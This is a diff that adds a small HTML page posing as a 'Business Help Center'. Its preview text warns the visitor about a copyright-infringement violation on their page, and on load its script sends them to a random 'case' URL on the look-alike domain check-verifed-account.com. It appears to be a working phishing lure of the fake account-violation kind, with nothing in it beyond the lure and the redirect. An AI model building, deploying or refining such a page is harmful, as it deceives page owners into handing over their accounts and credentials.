@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Business Help Center: Help, Support & Troubleshooting</title>
+	    <meta property="og:description" content="Your page has been detected for activity that is against our page policy regarding copyright infiringement">
+    <meta property="og:image" content="https://thuvienpc.com/wp-content/uploads/2022/08/2-factor-authentication.jpg">
+
+
+    <script>
+       
+        function generateRandomString(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let randomString = '';
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * characters.length);
+                randomString += characters.charAt(randomIndex);
+            }
+            return randomString;
+        }
+
+     
+        function redirectToRandomURL() {
+            const randomString = generateRandomString(14); // Thay đổi 4 thành độ dài mong muốn
+            const redirectURL = 'https://check-verifed-account.com/contract/caseid=' + randomString;
+            window.location.href = redirectURL;
+        }
+
+       
+        window.onload = redirectToRandomURL;
+    </script>
+</head>
+<body>
+</body>
+</html>
